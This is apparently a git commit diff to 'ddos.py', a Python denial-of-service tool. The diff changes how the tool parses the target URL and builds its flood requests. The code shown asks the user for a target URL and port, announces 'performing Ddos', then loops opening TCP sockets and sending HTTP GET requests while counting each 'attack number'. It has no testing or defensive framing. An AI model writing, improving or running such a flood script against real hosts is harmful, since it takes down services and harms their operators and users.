451d36549455e2cf4dd65116da2fefc6b5e6a2d7
dhungx <139793488+dhungx@users.noreply.github.com>
2024-08-10 20:36:18 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -6,17 +6,6 @@ import time
 from colorama import Fore, Style
 from urllib.parse import urlparse
 
-def get_ip_from_url(url):
-    try:
-        # Xử lý URL để loại bỏ giao thức (http, https)
-        parsed_url = urlparse(url)
-        hostname = parsed_url.netloc if parsed_url.netloc else parsed_url.path
-        ip_address = socket.gethostbyname(hostname)
-        return ip_address
-    except socket.gaierror:
-        print("Invalid URL or unable to resolve IP address. Please try again.")
-        return None
-
 def ddos():
     os.system("clear")
     print("press CTRL + C and press ENTER to exit !!!")
@@ -31,11 +20,15 @@ def ddos():
     attack_num = 0
     while True:
         target_url = input(Fore.RED + Style.BRIGHT + "ENTER URL OF THE HOST : ")
-        trget = get_ip_from_url(target_url)
-        if trget:
+        parsed_url = urlparse(target_url)
+        if parsed_url.scheme and parsed_url.netloc:
+            trget = parsed_url.netloc
             break
+        else:
+            print("Invalid URL. Please try again.")
+
     fake = '192.178.1.38'
-    
+
     while True:
         try:
             port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
@@ -44,9 +37,10 @@ def ddos():
             continue
         else:
             break
-    print(f"performing Ddos on {target_url} (IP: {trget}) on PORT {port} using FAKE IP {fake}")
+
+    print(f"performing Ddos on {target_url} (Host: {trget}) on PORT {port} using FAKE IP {fake}")
     print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect, you can restart the script and again enter the details correctly!!")
-    
+
     time.sleep(4)
     print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
     print("seconds : 3")
@@ -62,8 +56,8 @@ def ddos():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((trget, port))
-                s.sendto(("GET /" + target_url + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
-                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
+                s.sendto(("GET /" + parsed_url.path + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
+                s.sendto(('Host: ' + trget + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
                 print("packet send!! attack number : " + str(attack_num))
